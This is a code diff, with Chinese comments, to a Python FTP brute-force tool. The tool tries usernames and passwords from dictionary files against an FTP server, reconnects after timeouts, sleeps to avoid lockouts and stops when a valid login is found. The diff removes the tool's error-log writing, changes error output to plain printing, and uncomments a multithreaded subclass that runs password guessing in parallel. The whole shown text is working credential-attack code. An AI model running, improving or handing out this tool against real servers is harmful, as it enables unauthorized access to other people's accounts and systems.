@@ -29,8 +29,7 @@ class FtpBruteForce:
 
     @staticmethod
     def error_message(message):
-        message = f"\033[1;31m{message}\033[0m"  # 将报错消息标记为红色字体
-        return message
+        print(f"\033[1;31m{message}\033[0m")  # 将报错消息标记为红色字体
 
     @staticmethod
     def stop(max_num):  # 当尝试次数达到一定值时，休眠5秒
@@ -140,10 +139,10 @@ class FtpBruteForce:
                             # error_login.append(self.error_message(f"用户名：{user} 密码：{password} 登录失败，原因：{error}"))
                             # break  # 密码错误，尝试下一个密码
                             if "530 Permission denied" in str(error):
-                                error_login.append(self.error_message(f"用户名：{user} 密码：{password} 登录失败，FTP拒绝连接"))
+                                self.error_message(f"用户名：{user} 密码：{password} 登录失败，FTP拒绝连接")
                                 break
                             elif "530 Login incorrect" in str(error):
-                                error_login.append(self.error_message(f"用户名：{user} 密码：{password} 登录失败"))
+                                self.error_message(f"用户名：{user} 密码：{password} 登录失败")
                                 break
                             else:
                                 pass
@@ -154,10 +153,10 @@ class FtpBruteForce:
                             #                     # 4.用户被禁止访问FTP服务器。
                             #                     # 5./etc/vsftpd/vsftpd.conf配置问题
                         except (TimeoutError, BrokenPipeError):
-                            error_login.append(self.error_message(f"用户名：{user} 密码：{password} 登录超时"))
+                            self.error_message(f"用户名：{user} 密码：{password} 登录超时")
                             self.attempted_times += 1
                             if self.attempted_times >= 5:
-                                error_login.append(self.error_message(f"尝试次数超过限制，将跳过此用户密码组合"))
+                                self.error_message(f"尝试次数超过限制，将跳过此用户密码组合")
                                 break  # 尝试次数达到上限，跳过此组合
                             else:
                                 self.reconnect()  # 重连
@@ -167,49 +166,44 @@ class FtpBruteForce:
                             continue
                     # 如果到达这里，说明已找到有效的登录信息，退出程序
                     if found_valid_login:
-                        #   将错误信息写入日志
-                        with open("FtpError.log", "a+") as error_log:
-                            for error_message in error_login:
-                                error_log.write(strftime("%Y-%m-%d %H:%M:%S"))
-                                error_log.write(str(error_message) + "\n")
                         exit()
                     # 如果到达这里，说明当前用户的所有密码都已尝试过
                     if password_index + 1 < len(password_tuples):
                         continue
                     else:
-                        error_login.append(self.error_message(f"当前用户和密码组合尝试完毕，未找到有效登录信息"))
+                        self.error_message(f"当前用户和密码组合尝试完毕，未找到有效登录信息")
 
     def __del__(self):
         self.reconnect(connection=True)
 
 
 # 创建多线程登录子类
-# class MultiThreadedLogin(FtpBruteForce):
-#     """
-#     多线程登录破解
-#     """
-#     def __init__(self, server_address, user_dict_path, password_dict_path, user_tuple, password_tuple, server_port=21):
-#         super().__init__(server_address, user_dict_path, password_dict_path, server_port)
-#         self.users = user_tuple
-#         self.passwords = password_tuple
-#         self.threads = []
-#
-#     def start_brute_force(self):
-#         for user in self.users:
-#             user_passwords = Queue()
-#             for password in self.passwords:
-#                 user_passwords.put(password)
-#
-#             thread = Thread(target=self.login_threaded, args=(user, user_passwords))
-#             self.threads.append(thread)
-#             thread.start()
-#
-#     def login_threaded(self, user, passwords_queue):
-#         while not passwords_queue.empty():
-#             password = passwords_queue.get()
-#             self.login(user, password)
-#             passwords_queue.task_done()
-#
-#     def join_all_threads(self):
-#         for thread in self.threads:
-#             thread.join()
+class MultiThreadedLogin(FtpBruteForce):
+    """
+    多线程登录破解
+    """
+    def __init__(self, server_address, user_dict_path, password_dict_path, user_tuple, password_tuple, server_port=21):
+        super().__init__(server_address, user_dict_path, password_dict_path, server_port)
+        self.users = user_tuple
+        self.passwords = password_tuple
+        self.threads = []
+
+    def start_brute_force(self):
+        for user in self.users:
+            user_passwords = Queue()
+            for password in self.passwords:
+                user_passwords.put(password)
+
+            thread = Thread(target=self.login_threaded, args=(user, user_passwords))
+            self.threads.append(thread)
+            thread.start()
+
+    def login_threaded(self, user, passwords_queue):
+        while not passwords_queue.empty():
+            password = passwords_queue.get()
+            self.login(user, password)
+            passwords_queue.task_done()
+
+    def join_all_threads(self):
+        for thread in self.threads:
+            thread.join()
